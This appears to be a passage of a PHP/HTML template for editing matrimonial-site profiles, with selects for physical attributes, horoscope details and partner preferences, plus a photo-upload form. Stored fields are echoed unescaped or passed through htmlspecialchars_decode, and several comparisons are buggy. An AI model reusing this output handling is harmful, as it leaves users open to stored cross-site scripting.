        <option value="<?php echo $DatabaseCo->dbRow->mtongue_id; ?>"
                <?php
        if(in_array($DatabaseCo->dbRow->mtongue_id,$search_array912)) 
        {
        echo "selected";
        }
        ?>>
        <?php echo $DatabaseCo->dbRow->mtongue_name; ?>
        </option>
      <?php } ?>
      </select>
  </div>
</div>
<div class="col-md-6">
  	<div class="form-group">
    <label>Drinking Habits
    </label>
    <select class="form-control" name="drink">
      <option value="">Select
      </option>
      <option value="No" 
              <?php if($row['drink']=='No'){ echo "selected";}?>>No
      </option>
    <option value="Yes" 
            <?php if($row['drink']=='Yes'){ echo "selected";}?>>Yes
    </option>
  <option value="Drinks Socially" 
          <?php if($row['drink']=='Drinks Socially'){ echo "selected";}?>>Drinks Socially
  </option>
</select>
</div>
	<div class="form-group">
      <label>Hobbies
      </label>
      <textarea name="hobby" class="form-control">
        <?php if($row['hobby']!=''){ echo htmlspecialchars_decode($row['hobby'],ENT_QUOTES);}?>
      </textarea>
    </div>
</div>
</div>
<h3 class="text-success">
  <i class="fa fa-male gtMarginRight10">
  </i>&nbsp;Physical Attribute
</h3>
<div class="row">
<div class="col-md-6">
    <div class="form-group">
      <label>Height
      </label>
      <select class="form-control" data-validetta="required" name="height">
        <option value="48">Below 4ft
        </option>
        <option value="54">4ft 06in
        </option>
        <option value="55">4ft 07in
        </option>
        <option value="56">4ft 08in
        </option>
        <option value="57">4ft 09in
        </option>
        <option value="58">4ft 10in
        </option>
        <option value="59">4ft 11in
        </option>
        <option value="60">5ft
        </option>
        <option value="61">5ft 01in
        </option>
        <option value="62">5ft 02in
        </option>
        <option value="63">5ft 03in
        </option>
        <option value="64">5ft 04in
        </option>
        <option value="65">5ft 05in
        </option>
        <option value="66">5ft 06in
        </option>
        <option value="67">5ft 07in
        </option>
        <option value="68">5ft 08in
        </option>
        <option value="69">5ft 09in
        </option>
        <option value="70">5ft 10in
        </option>
        <option value="71">5ft 11in
        </option>
        <option value="72">6ft
        </option>
        <option value="73">6ft 01in
        </option>
        <option value="74">6ft 02in
        </option>
        <option value="75">6ft 03in
        </option>
        <option value="76">6ft 04in
        </option>
        <option value="77">6ft 05in
        </option>
        <option value="78">6ft 06in
        </option>
        <option value="79">6ft 07in
        </option>
        <option value="80">6ft 08in
        </option>
        <option value="81">6ft 09in
        </option>
        <option value="82">6ft 10in
        </option>
        <option value="83">6ft 11in
        </option>
        <option value="84">7ft
        </option>
        <option value="85">Above 7ft
        </option>
        <option value="<?php if(isset($row['height']) && $row['height']!='') {echo $row['height'];}?>" 
                <?php if(isset($row['height']) && $row['height']!='') {echo "selected";}?>>
        <?php 
if(isset($row['height']) && $row['height']!='')
{ $ao=$row['height'];$ft= (int) ($ao/12);$inch = $ao % 12;echo $ft."ft". " ".$inch."in";}?>
        </option>
      </select>
  </div>
  	<div class="form-group">
    <label>Body Type
    </label>
    <select class="form-control" name="bodytype">
      <option value="Slim" 
              <?php if(isset($row['bodytype']) && $row['bodytype']=='Slim'){ echo "selected";}?>>Slim
      </option>
    <option value="Average" 
            <?php if(isset($row['bodytype']) && $row['bodytype']=='Average'){ echo "selected";}?>>Average
    </option>
  <option value="Athletic" 
          <?php if(isset($row['bodytype']) && $row['bodytype']=='Athletic'){ echo "selected";}?>>Athletic
  </option>
<option value="Heavy" 
        <?php if(isset($row['bodytype']) && $row['bodytype']=='Heavy'){ echo "selected";}?>>Heavy
</option>
</select>
</div>
  	<div class="form-group">
  <label>Physical Status
  </label>
  <select class="form-control" name="physical_status">
    <option class="">Select Physical Status
    </option>
    <option value="Normal">Normal
    </option>
    <option value="Physically challenged">Physically challenged
    </option>
  </select>
</div>
</div>
<div class="col-md-6">
	<div class="form-group">
    <label>Weight
    </label>
    <select class="form-control" name="weight" data-validetta="required">
      <option value="40">40 Kg
      </option>
      <option value="41">41 Kg
      </option>
      <option value="42">42 Kg
      </option>
      <option value="43">43 Kg
      </option>
      <option value="44">44 Kg
      </option>
      <option value="45">45 Kg
      </option>
      <option value="46">46 Kg
      </option>
      <option value="47">47 Kg
      </option>
      <option value="48">48 Kg
      </option>
      <option value="49">49 Kg
      </option>
      <option value="50">50 Kg
      </option>
      <option value="51">51 Kg
      </option>
      <option value="52">52 Kg
      </option>
      <option value="53">53 Kg
      </option>
      <option value="54">54 Kg
      </option>
      <option value="55">55 Kg
      </option>
      <option value="56">56 Kg
      </option>
      <option value="57">57 Kg
      </option>
      <option value="58">58 Kg
      </option>
      <option value="59">59 Kg
      </option>
      <option value="60">60 Kg
      </option>
      <option value="61">61 Kg
      </option>
      <option value="62">62 Kg
      </option>
      <option value="63">63 Kg
      </option>
      <option value="64">64 Kg
      </option>
      <option value="65">65 Kg
      </option>
      <option value="66">66 Kg
      </option>
      <option value="67">67 Kg
      </option>
      <option value="68">68 Kg
      </option>
      <option value="69">69 Kg
      </option>
      <option value="70">70 Kg
      </option>
      <option value="71">71 Kg
      </option>
      <option value="72">72 Kg
      </option>
      <option value="73">73 Kg
      </option>
      <option value="74">74 Kg
      </option>
      <option value="75">75 Kg
      </option>
      <option value="76">76 Kg
      </option>
      <option value="77">77 Kg
      </option>
      <option value="78">78 Kg
      </option>
      <option value="79">79 Kg
      </option>
      <option value="80">80 Kg
      </option>
      <option value="81">81 Kg
      </option>
      <option value="82">82 Kg
      </option>
      <option value="83">83 Kg
      </option>
      <option value="84">84 Kg
      </option>
      <option value="85">85 Kg
      </option>
      <option value="86">86 Kg
      </option>
      <option value="87">87 Kg
      </option>
      <option value="88">88 Kg
      </option>
      <option value="89">89 Kg
      </option>
      <option value="90">90 Kg
      </option>
      <option value="91">91 Kg
      </option>
      <option value="92">92 Kg
      </option>
      <option value="93">93 Kg
      </option>
      <option value="94">94 Kg
      </option>
      <option value="95">95 Kg
      </option>
      <option value="96">96 Kg
      </option>
      <option value="97">97 Kg
      </option>
      <option value="98">98 Kg
      </option>
      <option value="99">99 Kg
      </option>
      <option value="100">100 Kg
      </option>
      <option value="101">101 Kg
      </option>
      <option value="102">102 Kg
      </option>
      <option value="103">103 Kg
      </option>
      <option value="104">104 Kg
      </option>
      <option value="105">105 Kg
      </option>
      <option value="106">106 Kg
      </option>
      <option value="107">107 Kg
      </option>
      <option value="108">108 Kg
      </option>
      <option value="109">109 Kg
      </option>
      <option value="110">110 Kg
      </option>
      <option value="111">111 Kg
      </option>
      <option value="112">112 Kg
      </option>
      <option value="113">113 Kg
      </option>
      <option value="114">114 Kg
      </option>
      <option value="115">115 Kg
      </option>
      <option value="116">116 Kg
      </option>
      <option value="117">117 Kg
      </option>
      <option value="118">118 Kg
      </option>
      <option value="119">119 Kg
      </option>
      <option value="120">120 Kg
      </option>
      <option value="121">121 Kg
      </option>
      <option value="122">122 Kg
      </option>
      <option value="123">123 Kg
      </option>
      <option value="124">124 Kg
      </option>
      <option value="125">125 Kg
      </option>
      <option value="126">126 Kg
      </option>
      <option value="127">127 Kg
      </option>
      <option value="128">128 Kg
      </option>
      <option value="129">129 Kg
      </option>
      <option value="130">130 Kg
      </option>
      <option value="131">131 Kg
      </option>
      <option value="132">132 Kg
      </option>
      <option value="133">133 Kg
      </option>
      <option value="134">134 Kg
      </option>
      <option value="135">135 Kg
      </option>
      <option value="136">136 Kg
      </option>
      <option value="137">137 Kg
      </option>
      <option value="138">138 Kg
      </option>
      <option value="139">139 Kg
      </option>
      <option value="140">140 Kg
      </option>
      <option value="<?php if(isset($row['weight']) && $row['weight']!='') {echo $row['weight']; }?>" 
              <?php if(isset($row['weight']) && $row['weight']!='') {echo "selected"; }?>> 
      <?php if(isset($row['weight']) && $row['weight']!='') {echo $row['weight']; }?> Kg
      </option>
    </select>
</div>
	<div class="form-group">
  <label>Complextion
  </label>
  <select class="form-control" name="complexion">
    <option value="Very Fair" 
            <?php if(isset($row['complexion']) && $row['complexion']=='Very Fair'){ echo "selected";}?>>Very Fair
    </option>
  <option value="Fair" 
          <?php if(isset($row['complexion']) && $row['complexion']=='Fair'){ echo "selected";}?>>Fair
  </option>
<option value="Athletic" 
        <?php if(isset($row['complexion']) && $row['complexion']=='Athletic'){ echo "selected";}?>>Athletic
</option>
<option value="Wheatish Brown" 
        <?php if(isset($row['complexion']) && $row['complexion']=='Wheatish Brown'){ echo "selected";}?>>Wheatish Brown
</option>
<option value="Dark" 
        <?php if(isset($row['complexion']) && $row['complexion']=='Dark'){ echo "selected";}?>>Dark
</option>
</select>
</div>
</div>
</div>
<h3 class="text-success">
  <i class="fa fa-moon-o gtMarginRight10">
  </i>&nbsp;Horoscope Details
</h3>
<div class="row">
  <div class="col-md-6">
    <div class="form-group">
      <label>Dosh
      </label>
      <?php $manglik=explode(", ",$row['manglik']);?>
      <select class="chosen-select form-control" name="manglik[]" multiple>
        <option value="Manglik" 
                <?php if(isset($manglik) && in_array("Manglik",$manglik)) {echo "selected";} ?>>Manglik
        </option>
      <option value="Sarpa-dosh" 
              <?php if(isset($manglik) && in_array("Sarpa-dosh",$manglik)) {echo "selected";} ?>>Sarpa-dosh
      </option>
    <option value="Kala sarpa dosh" 
            <?php if(isset($manglik) && in_array("Kala sarpa dosh",$manglik)) {echo "selected";} ?>>Kala sarpa dosh
    </option>
  <option value="Rahu-dosh" 
          <?php if(isset($manglik) && in_array("Rahu-dosh",$manglik)) {echo "selected";} ?>>Rahu-dosh
  </option>
<option value="Kethu dosh" 
        <?php if(isset($manglik) && in_array("Kethu dosh",$manglik)) {echo "selected";} ?>>Kethu dosh
</option>
<option value="Kalathra-dosh" 
        <?php if(isset($manglik) && in_array("Kalathra-dosh",$manglik)) {echo "selected";} ?>>Kalathra-dosh
</option>
</select>
</div>
<div class="form-group">
  <label>Star
  </label>
  <select class="form-control"  name="star">
    <option value="">Does not matter
    </option>
    <option value="Ashvini" <?php if($row->star=='Ashvini'){ echo "selected";}?>>
															Ashvini
														</option>
													  	<option value="Bharani" <?php if($row->star=='Bharani'){ echo "selected";}?>>
															Bharani
													  	</option>
														<option value="Krittika" <?php if($row->star=='Krittika'){ echo "selected";}?>>
															Krittika
														</option>
														<option value="Rohini" <?php if($row->star=='Rohini'){ echo "selected";}?>>
															Rohini
														</option>
														<option value="Mrigashirsha" <?php if($row->star=='Mrigashirsha'){ echo "selected";}?>>
															Mrigashirsha
														</option>
														<option value="Ardra" <?php if($row->star=='Ardra'){ echo "selected";}?>>
															Ardra
														</option>
														<option value="Punarvasu" <?php if($row->star=='Punarvasu'){ echo "selected";}?>>
															Punarvasu
														</option>
														<option value="Pushya" 
																<?php if($row->star=='Pushya'){ echo "selected";}?>>Pushya
														</option>
														<option value="Ashlesha" <?php if($row->star=='Ashlesha'){ echo "selected";}?>>
														Ashlesha
														</option>
														<option value="Magha" <?php if($row->star=='Magha'){ echo "selected";}?>>
															Magha
														</option>
														<option value="Purva Phalguni" <?php if($row->star=='Purva Phalguni'){ echo "selected";}?>>
															Purva Phalguni
														</option>
														<option value="Uttara Phalguni" <?php if($row->star=='Uttara Phalguni'){ echo "selected";}?>>
															Uttara Phalguni
														</option>
														<option value="Hasta" <?php if($row->star=='Hasta'){ echo "selected";}?>>
															Hasta
														</option>
														<option value="Chitra" <?php if($row->star=='Chitra'){ echo "selected";}?>>
															Chitra
														</option>
														<option value="Swati" <?php if($row->star=='Swati'){ echo "selected";}?>>
															Swati
														</option>
														<option value="Vishakha" <?php if($row->star=='Vishakha'){ echo "selected";}?>>
															Vishakha
														</option>
														<option value="Anuradha" <?php if($row->star=='Anuradha'){ echo "selected";}?>>
															Anuradha
														</option>
														<option value="Jyeshtha" <?php if($row->star=='Jyeshtha'){ echo "selected";}?>>
															Jyeshtha
														</option>
														<option value="Mula" <?php if($row->star=='Mula'){ echo "selected";}?>>
															Mula
														</option>
														<option value="Purva Ashadha" <?php if($row->star=='Purva Ashadha'){ echo "selected";}?>>
															Purva Ashadha
														</option>
														<option value="Uttara Ashadha" <?php if($row->star=='Uttara Ashadha'){ echo "selected";}?>>
															Uttara Ashadha
														</option>
														<option value="Shravana" <?php if($row->star=='Shravana'){ echo "selected";}?>>
															Shravana
														</option>
														<option value="Dhanishtha" <?php if($row->star=='Dhanishtha'){ echo "selected";}?>>
															Dhanishtha
														</option>
														<option value="Shatabhisha" <?php if($row->star=='Shatabhisha'){ echo "selected";}?>>
															Shatabhisha
														</option>
														<option value="Purva Bhadrapada" <?php if($row->star=='Purva Bhadrapada'){ echo "selected";}?>>
															Purva Bhadrapada
														</option>
														<option value="Uttara Bhadrapada" <?php if($row->star=='Uttara Bhadrapada'){ echo "selected";}?>>
															Uttara Bhadrapada
														</option>
														<option value="Revati" <?php if($row->star=='Revati'){ echo "selected";}?>>
															Revati
														</option> 	
</select>
</div>
<div class="form-group">
  <label>Birth Place
  </label>
  <input type="text" class="form-control" name="birth_place" placeholder="Enter Birth Place" value="<?php if(isset($row['birthplace'])){ if($row['birthplace'] != ''){ echo $row['birthplace']; }}?>">
</div>
</div>
<div class="col-md-6">
  <div class="form-group">
    <label>Moonsign
    </label>
    <select class="form-control" name="moonsign" id="moonsign">
      <option value="Does not matter" 
              <?php if($row['moonsign']=='Does not matter'){ echo "selected";}?>>Does not matter
      </option>
    <option value="Mesh (Aries)" 
            <?php if($row['moonsign']=='Mesh (Aries)'){ echo "selected";}?>>Mesh (Aries)
    </option>
  <option value="Vrishabh (Taurus)" 
          <?php if($row['moonsign']=='Vrishabh (Taurus)'){ echo "selected";}?>>Vrishabh (Taurus)
  </option>
<option value="Mithun (Gemini)" 
        <?php if($row['moonsign']=='Mithun (Gemini)'){ echo "selected";}?>>Mithun (Gemini)
</option>
<option value="Karka (Cancer)" 
        <?php if($row['moonsign']=='Karka (Cancer)'){ echo "selected";}?>>Karka (Cancer)
</option>
<option value="Simha (Leo)" 
        <?php if($row['moonsign']=='Simha (Leo)'){ echo "selected";}?>>Simha (Leo)
</option>
<option value="Kanya (Virgo)" 
        <?php if($row['moonsign']=='Kanya (Virgo)'){ echo "selected";}?>>Kanya (Virgo)
</option>
<option value="Tula (Libra)" 
        <?php if($row['moonsign']=='Tula (Libra)'){ echo "selected";}?>>Tula (Libra)
</option>
<option value="Vrischika (Scorpio)" 
        <?php if($row['moonsign']=='Vrischika (Scorpio)'){ echo "selected";}?>>Vrischika (Scorpio)
</option>
<option value="Dhanu (Sagittarious)" 
        <?php if($row['moonsign']=='Dhanu (Sagittarious)'){ echo "selected";}?>>Dhanu (Sagittarious)
</option>
<option value="Makar (Capricorn)" 
        <?php if($row['moonsign']=='Makar (Capricorn)'){ echo "selected";}?>>Makar (Capricorn)
</option>
<option value="Kumbha (Aquarious)" 
        <?php if($row['moonsign']=='Kumbha (Aquarious)'){ echo "selected";}?>>Kumbha (Aquarious)
</option>
<option value="Meen (Pisces)" 
        <?php if($row['moonsign']=='Meen (Pisces)'){ echo "selected";}?>>Meen (Pisces)
</option>
</select>
</div>
<div class="form-group">
  <label>Birth Time
  </label>
  <select name="birth_time" class="form-control">
	  <?php if(isset($row['birthtime'])){?>
	  <option value="<?php if(isset($row['birthtime'])){ if($row['birthtime']){echo $row['birthtime'];}} ?>"><?php if(isset($row['birthtime'])){ if($row['birthtime']){echo $row['birthtime'];}} ?></option>
	  <?php } ?>
    <?php 	
for($i=12;$i>0;$i--)
{
for($j=0;$j<60;$j++)
{
if(strlen($j)=='1')
{
$k='0'.$j;	
}else
{
$k=$j;
}
?>
    <option value="<?php echo $i.":".$k." am";?>">
      <?php echo $i.":".$k." am";?>
    </option>	
    <?php
}
}
?>
    <?php 	
for($i=12;$i>0;$i--)
{
for($j=0;$j<60;$j++)
{
if(strlen($j)=='1')
{
$k='0'.$j;	
}else
{
$k=$j;
}
?>
    <option value="<?php echo $i.":".$k." pm";?>">
      <?php echo $i.":".$k." pm";?>
    </option>	
    <?php
}
}
?>
  </select>
</div>
</div>
</div>
<h3 class="text-success">
  <i class="fa fa-file-o gtMarginRight10">
  </i>&nbsp;About Me
</h3>
<div class="row">
  <div class="col-md-12">
    <div class="form-group">
      <label>About Me
      </label>
      <textarea class="form-control" name="profile_text"  rows="5">
        <?php if($row['profile_text']!='Not Available'){ echo htmlspecialchars_decode($row['profile_text'],ENT_QUOTES);}?>
      </textarea>
    </div>
  </div>
</div>
<div class="form-group text-center">
  <input type="submit" class="btn btn-green btn-lg" name="submit_form1" value="Submit">
</div>
</form>
</div>
<div class="tab-pane" id="tab_2">
  <div class='error-msg' id='validationSummary' style="display:none !important;"></div>
  <div class="clearfix"></div>
  <?php if(isset($_GET['matri_id']) && $_GET['matri_id']!='')
{
?>
  <form method="post" name="upload_photo" id="edit-form" enctype="multipart/form-data" action="image_validation?matri_id=<?php echo $row['matri_id']; ?>">
    <div class="row">
      <h3 class="text-center col-lg-12 col-sm-2 col-xs-12 mt-10">
        Upload Photo
      </h3>
      <div class="row">
        <div class="col-md-6 col-xs-12">
          <div class="form-group col-xs-12">
          	<div class="">
          	<label>
              Photo 1:
            </label>
            <div class="clearfix"></div>
            <?php 
			if($row['photo1']!='')
			{ ?>
            	<img src="../my_photos/<?php echo $row['photo1'];?>" width="150px" class="img-thumbnail"/>
            <?php	
			}
			else if ($row['photo1']=='' && $row['gender']=='Groom')
			{
			?>
            <img src="../photo-default.png" width="150px" class="img-thumbnail"/>
            <?php }
			else
			{ ?>
            <img src="../img/photo-default.png" width="150px" class="img-thumbnail"/>
            <?php }	?>
            
            <input type="file" name="photo1" id="photo1" class="form-control mt-10" >
            </div>
          </div>
          <div class="clearfix"></div>
          <div class="form-group col-md-12">
          	<div class="">
          	<label>
              Photo 2:
            </label>
            <div class="clearfix"></div>
            <?php 
			if($row['photo2']!='')
			{ ?>
            <img src="../my_photos/<?php echo $row['photo2'];?>" width="150px" class="img-thumbnail"/>
            <?php	
			}
			else if ($row['photo2']=='' && $row['gender']=='Groom')
			{ ?>
            <img src="../photo-default.png" width="150px;" class="img-thumbnail"/>
            <?php }
			else
			{ ?>
            <img src="../img/photo-default.png" width="150px;" class="img-thumbnail"/>
            <?php } ?>
            
            <input type="file" name="photo2" id="photo2" class="form-control mt-10" >
            </div>
          </div>
          <div class="clearfix"></div>
          <div class="form-group col-md-12">
          	<div class="">
            <label>
              Photo 3:
            </label>
            <div class="clearfix"></div>
            <?php 
			if($row['photo3']!='')
			{ ?>
            <img src="../my_photos/<?php echo $row['photo3'];?>" width="150px" class="img-thumbnail"/>
            <?php	
			}
			else if ($row['photo3']=='' && $row['gender']=='Groom')
			{ ?>
            <img src="../photo-default.png" width="150px" class="img-thumbnail"/>
            <?php }
			else
			{ ?>
            <img src="../img/photo-default.png" width="150px" class="img-thumbnail"/>
            <?php } ?>
            
            <input type="file" name="photo3" id="photo3" class="form-control mt-10" >
            </div>
          </div>
          <div class="clearfix"></div>
        </div>
        <div class="col-md-6 col-xs-12">
          <div class="form-group col-md-12">
          	<div class="">
            <label>
              Photo 4:
            </label>
            <div class="clearfix"></div>
            <?php 
			if($row['photo4']!='')
			{ ?>
            <img src="../my_photos/<?php echo $row['photo4'];?>" width="150px" class="img-thumbnail"/>
            <?php	
			}
			else if ($row['photo4']=='' && $row['gender']=='Groom')
			{ ?>
            <img src="../photo-default.png" width="150px" class="img-thumbnail"/>
            <?php }
			else
			{ ?>
            <img src="../img/photo-default.png" width="150px" class="img-thumbnail"/>
            <?php	}
			?>
            
            <input type="file" name="photo4" id="photo4" class="form-control mt-10" >
            </div>
          </div>
          <div class="form-group col-md-12">
          	<div class="">
             <label>
              Photo 5:
            </label>
            <div class="clearfix"></div>
            <?php 
			if($row['photo5']!='')
			{ ?>
            <img src="../my_photos/<?php echo $row['photo5'];?>" width="150px" class="img-thumbnail"/>
            <?php	
			}
			else if ($row['photo5']=='' && $row['gender']=='Groom')
			{ ?>
            <img src="../photo-default.png" width="150px" class="img-thumbnail"/>
            <?php }
			else
			{ ?>
            <img src="../img/photo-default.png" width="150px" class="img-thumbnail"/>
            <?php	}
			?>
           
            <input type="file" name="photo5" id="photo5" class="form-control mt-10" >
            </div>
          </div>
          <div class="form-group col-md-12">
          	<div class="">
            <label>
              Photo 6:
            </label>
            <div class="clearfix"></div>
            <?php 
			if($row['photo6']!='')
			{ ?>
            <img src="../my_photos/<?php echo $row['photo6'];?>" width="150px" class="img-thumbnail"/>
            <?php	
			}
			else if ($row['photo6']=='' && $row['gender']=='Groom')
			{ ?>
            <img src="../photo-default.png" width="150px" class="img-thumbnail"/>
            <?php }
			else
			{ ?>
            <img src="../img/photo-default.png" width="150px" class="img-thumbnail"/>
            <?php	}
			?>
            
            <input type="file" name="photo6" id="photo6" class="form-control mt-10" >
            </div>
          </div>
        </div>
      </div>
    </div>
    <div class="row mt-10">
      <div class="col-xs-12 col-md-12 text-center">
        <input type="submit" class="btn btn-green btn-lg" name="submitimage" value="Submit"> 
      </div>
    </div>
    <input type="hidden" name="old_photo1" value="<?php echo $row['photo1'];?>">
    <input type="hidden" name="old_photo2" value="<?php echo $row['photo2'];?>">
    <input type="hidden" name="old_photo3" value="<?php echo $row['photo3'];?>">
    <input type="hidden" name="old_photo4" value="<?php echo $row['photo4'];?>">
    <input type="hidden" name="old_photo5" value="<?php echo $row['photo5'];?>">
    <input type="hidden" name="old_photo6" value="<?php echo $row['photo6'];?>">
    <input type="hidden" id="max_basic_id">
    <input type="hidden" name="action" value="UPDATE">
  </form>
  <?php }
else
{ 
echo "First add basic deatil";
}
?>
</div>
<div class="tab-pane" id="tab_3">
  <form method="post" name="other_detail" id="other_detail"> 
    <h3 class="text-success">
      <i class="fa fa-user gtMarginRight10">
      </i>Basic Preference
    </h3>
    <div class="row">
      <div class="col-md-6">
        <div class="form-group">
          <label>Age
          </label>
          <div class="row">
            <div class="col-xs-5">
              <select class="form-control" name="pfrom_age">
                <option value="<?php echo $row['part_frm_age'];?>">
                  <?php echo $row['part_frm_age'];?> Years
                </option>
                <option value="18">18 Years
                </option>
                <option value="19">19 Years
                </option>
                <option value="20">20 Years
                </option>
                <option value="21">21 Years
                </option>
                <option value="22">22 Years
                </option>
                <option value="23">23 Years
                </option>
                <option value="24">24 Years
                </option>
                <option value="25">25 Years
                </option>
                <option value="26">26 Years
                </option>
                <option value="27">27 Years
                </option>
                <option value="28">28 Years
                </option>
                <option value="29">29 Years
                </option>
                <option value="30">30 Years
                </option>
                <option value="31">31 Years
                </option>
                <option value="32">32 Years
                </option>
                <option value="33">33 Years
                </option>
                <option value="34">34 Years
                </option>
                <option value="35">35 Years
                </option>
                <option value="36">36 Years
                </option>
                <option value="37">37 Years
                </option>
                <option value="38">38 Years
                </option>
                <option value="39">39 Years
                </option>
                <option value="40">40 Years
                </option>
                <option value="41">41 Years
                </option>
                <option value="42">42 Years
                </option>
                <option value="43">43 Years
                </option>
                <option value="44">44 Years
                </option>
                <option value="45">45 Years
                </option>
                <option value="46">46 Years
                </option>
                <option value="47">47 Years
                </option>
                <option value="48">48 Years
                </option>
                <option value="49">49 Years
                </option>
                <option value="50">50 Years
                </option>
                <option value="51">51 Years
                </option>
                <option value="52">52 Years
                </option>
                <option value="53">53 Years
                </option>
                <option value="54">54 Years
                </option>
                <option value="55">55 Years
                </option>
                <option value="56">56 Years
                </option>
                <option value="57">57 Years
                </option>
                <option value="58">58 Years
                </option>
                <option value="59">59 Years
                </option>
                <option value="60">60 Years
                </option>                                    		
              </select>
            </div>
            <h4 class="col-xs-2 text-center">
              To
            </h4>
            <div class="col-xs-5">
              <select class="form-control" name="pto_age">	
                <option value="<?php echo $row['part_to_age'];?>">
                  <?php echo $row['part_to_age'];?> Years
                </option>
                <option value="18">18 Years
                </option>
                <option value="19">19 Years
                </option>
                <option value="20">20 Years
                </option>
                <option value="21">21 Years
                </option>
                <option value="22">22 Years
                </option>
                <option value="23">23 Years
                </option>
                <option value="24">24 Years
                </option>
                <option value="25">25 Years
                </option>
                <option value="26">26 Years
                </option>
                <option value="27">27 Years
                </option>
                <option value="28">28 Years
                </option>
                <option value="29">29 Years
                </option>
                <option value="30">30 Years
                </option>
                <option value="31">31 Years
                </option>
                <option value="32">32 Years
                </option>
                <option value="33">33 Years
                </option>
                <option value="34">34 Years
                </option>
                <option value="35">35 Years
                </option>
                <option value="36">36 Years
                </option>
                <option value="37">37 Years
                </option>
                <option value="38">38 Years
                </option>
                <option value="39">39 Years
                </option>
                <option value="40">40 Years
                </option>
                <option value="41">41 Years
                </option>
                <option value="42">42 Years
                </option>
                <option value="43">43 Years
                </option>
                <option value="44">44 Years
                </option>
                <option value="45">45 Years
                </option>
                <option value="46">46 Years
                </option>
                <option value="47">47 Years
                </option>
                <option value="48">48 Years
                </option>
                <option value="49">49 Years
                </option>
                <option value="50">50 Years
                </option>
                <option value="51">51 Years
                </option>
                <option value="52">52 Years
                </option>
                <option value="53">53 Years
                </option>
                <option value="54">54 Years
                </option>
                <option value="55">55 Years
                </option>
                <option value="56">56 Years
                </option>
                <option value="57">57 Years
                </option>
                <option value="58">58 Years
                </option>
                <option value="59">59 Years
                </option>
                <option value="60">60 Years
                </option>
              </select>
            </div>
          </div>
        </div>
        <div class="form-group">
          <label>Height
          </label>
          <div class="row">
            <div class="col-xs-5">
              <select class="form-control" data-validetta="required" name="part_height">                                                	
                <option value="<?php echo $row['part_height'];?>" >
                  <?php $ao=$row['part_height'];$ft= (int) ($ao/12);$inch = $ao % 12;echo $ft."ft". " ".$inch."in";?>
                </option>                                        	
                <option value="48">Below 4ft
                </option>
                <option value="54">4ft 06in
                </option>
                <option value="55">4ft 07in
                </option>
                <option value="56">4ft 08in
                </option>
                <option value="57">4ft 09in
                </option>
                <option value="58">4ft 10in
                </option>
                <option value="59">4ft 11in
                </option>
                <option value="60">5ft
                </option>
                <option value="61">5ft 01in
                </option>
                <option value="62">5ft 02in
                </option>
                <option value="63">5ft 03in
                </option>
                <option value="64">5ft 04in
                </option>
                <option value="65">5ft 05in
                </option>
                <option value="66">5ft 06in
                </option>
                <option value="67">5ft 07in
                </option>
                <option value="68">5ft 08in
                </option>
                <option value="69">5ft 09in
                </option>
                <option value="70">5ft 10in
                </option>
                <option value="71">5ft 11in
                </option>
                <option value="72">6ft
                </option>
                <option value="73">6ft 01in
                </option>
                <option value="74">6ft 02in
                </option>
                <option value="75">6ft 03in
                </option>
                <option value="76">6ft 04in
                </option>
                <option value="77">6ft 05in
                </option>
                <option value="78">6ft 06in
                </option>
                <option value="79">6ft 07in
                </option>
                <option value="80">6ft 08in
                </option>
                <option value="81">6ft 09in
                </option>
                <option value="82">6ft 10in
                </option>
                <option value="83">6ft 11in
                </option>
                <option value="84">7ft
                </option>
                <option value="85">Above 7ft
                </option>
              </select>
            </div>
            <h4 class="col-xs-2 text-center">
              To
            </h4>
            <div class="col-xs-5">
              <select class="form-control" data-validetta="required" name="part_height_to">
                <option value="<?php echo $row['part_height_to'];?>">
                  <?php $ao=$row['part_height_to'];$ft= (int) ($ao/12);$inch = $ao % 12;echo $ft."ft". " ".$inch."in";?>
                </option>
                <option value="48">Below 4ft
                </option>
                <option value="54">4ft 06in
                </option>
                <option value="55">4ft 07in
                </option>
                <option value="56">4ft 08in
                </option>
                <option value="57">4ft 09in
                </option>
                <option value="58">4ft 10in
                </option>
                <option value="59">4ft 11in
                </option>
                <option value="60">5ft
                </option>
                <option value="61">5ft 01in
                </option>
                <option value="62">5ft 02in
                </option>
                <option value="63">5ft 03in
                </option>
                <option value="64">5ft 04in
                </option>
                <option value="65">5ft 05in
                </option>
                <option value="66">5ft 06in
                </option>
                <option value="67">5ft 07in
                </option>
                <option value="68">5ft 08in
                </option>
                <option value="69">5ft 09in
                </option>
                <option value="70">5ft 10in
                </option>
                <option value="71">5ft 11in
                </option>
                <option value="72">6ft
                </option>
                <option value="73">6ft 01in
                </option>
                <option value="74">6ft 02in
                </option>
                <option value="75">6ft 03in
                </option>
                <option value="76">6ft 04in
                </option>
                <option value="77">6ft 05in
                </option>
                <option value="78">6ft 06in
                </option>
                <option value="79">6ft 07in
                </option>
                <option value="80">6ft 08in
                </option>
                <option value="81">6ft 09in
                </option>
                <option value="82">6ft 10in
                </option>
                <option value="83">6ft 11in
                </option>
                <option value="84">7ft
                </option>
                <option value="85">Above 7ft
                </option>
              </select>
            </div>
          </div>
        </div>
        <div class="form-group">
          <label>Looking For
          </label>
          <select class="chosen-select form-control" name="looking[]" id="looking_for" data-validetta="required" multiple>
            <?php 
$get_looking = explode(", ",$row['looking_for']);?>
            <option value="Never Married" 
                    <?php if(in_array("Never Married",$get_looking)){echo "selected";}?>>Never Married
            </option>
          <option value="Widower" 
                  <?php if(in_array("Widower",$get_looking)){echo "selected";}?>>Widower
          </option>
        <option value="Divorced" 
                <?php if(in_array("Divorced",$get_looking)){echo "selected";}?>>Divorced
        </option>
      <option value="Awaiting Divorce" 
              <?php if(in_array("Awaiting Divorc",$get_looking)){echo "selected";}?>>Awaiting Divorce
      </option>
    </select>
</div>
<div class="form-group">
  <label>Physical Status
  </label>
  <select data-placeholder="Choose Patners Physical Status" class="chosen-select form-control" name="part_physical" multiple tabindex="4">
    <option value="Normal" 
            <?php if($row['part_physical']=="Normal"){ echo "selected";}?>>Normal
    </option>
  <option value="Physically-challenged " 
          <?php if($row['part_physical']=="Physically-challenged "){ echo "selected";}?>> Physically-challenged 
  </option>
<option value="Doesn't Matter" 
        <?php if($row['part_physical']=="Doesn't Matter"){ echo "selected";}?>>Doesn't Matter
</option>
</select>
</div>
</div>
<div class="col-md-6">
  <div class="form-group">
    <label>Food
    </label>
    <?php $search_array11 = explode(',',$row['part_diet']);?>             
    <select class="chosen-select form-control" name="part_diet[]" multiple>
      <option value="Occasionally Non-Veg" 
              <?php if(in_array("Occasionally Non-Veg",$search_array11)){ echo "selected";}?>>Occasionally Non-Veg
      </option>
    <option value="Vegetarian" 
            <?php if(in_array("Vegetarian",$search_array11)){ echo "selected";}?>>Vegetarian
    </option>
